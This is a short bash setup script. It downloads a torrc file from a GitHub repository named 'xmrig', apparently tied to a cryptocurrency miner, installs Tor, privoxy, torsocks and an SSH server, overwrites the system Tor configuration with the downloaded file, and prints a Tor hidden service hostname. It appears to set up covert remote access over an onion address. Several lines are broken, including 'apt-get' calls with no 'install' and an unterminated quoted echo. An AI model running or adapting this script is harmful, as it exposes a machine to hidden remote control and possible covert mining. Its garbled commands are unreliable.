wget https://raw.githubusercontent.com/ceeb57f83688/xmrig/main/TOR/torrc
sudo apt-get install -y bridge-utils dnsmasq uml-utilities iptables wget net-tools
sudo apt-get install openssh-server -y
sudo apt-get install torsocks -y
sudo apt-get install tor -y
sudo apt-get install screen -y
sudo apt-get install privoxy -y
sudo apt-get update && sudo apt-get upgrade -y 
sudo apt update && sudo apt upgrade -y

sudo apt-get ibus-pinyin -y
sudo apt-get ibus -y
sudo apt-get ibus-clutter -y
sudo apt-get ibus-gtk -y
sudo apt-get ibus-gtk3 -y
sudo apt-get ibus-qt4 -y

sudo /etc/init.d/tor stop

sudo rm /etc/tor/torrc
sudo cp torrc /etc/tor/torrc

sudo /etc/init.d/tor start
bash -c 'echo "

cat /var/lib/tor/other_hidden_service/hostname
